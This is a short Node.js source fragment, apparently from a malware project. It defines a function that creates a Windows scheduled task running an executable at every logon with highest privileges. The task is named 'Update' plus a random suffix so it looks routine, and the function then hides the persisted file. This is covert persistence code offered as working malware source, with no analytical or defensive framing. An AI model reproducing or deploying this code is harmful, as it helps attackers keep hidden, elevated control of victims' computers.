const childprocess = require('child_process');
const core = require('./core');

function addServicePersistence(persistencePath, random) {
    childprocess.execSync(`cmd /c schtasks /create /sc onlogon /tn Update${random} /tr \\"${persistencePath}\\" /F /rl highest`);
    core.hideFile(persistencePath);
}
